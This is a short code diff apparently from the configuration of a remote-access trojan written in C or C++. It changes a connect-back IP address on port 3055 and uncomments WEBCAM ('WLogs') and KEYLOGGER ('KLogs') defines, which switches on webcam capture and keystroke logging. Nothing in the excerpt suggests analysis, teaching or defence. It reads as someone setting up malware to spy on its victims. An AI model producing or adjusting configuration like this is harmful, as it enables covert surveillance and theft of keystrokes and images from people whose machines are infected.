@@ -20,7 +20,7 @@
 #include "install/Install.h"
 
 
-#define IP "192.168.82.182"
+#define IP "192.168.1.133"
 
 #define PORT 3055
 
@@ -30,7 +30,7 @@
 
 #define TIMING_RETRY 10000
 
-//#define WEBCAM "WLogs"
+#define WEBCAM "WLogs"
 
 #ifdef WEBCAM
 
@@ -39,7 +39,7 @@
 
 #endif
 
-//#define KEYLOGGER "KLogs"
+#define KEYLOGGER "KLogs"
 
 #ifdef KEYLOGGER
 
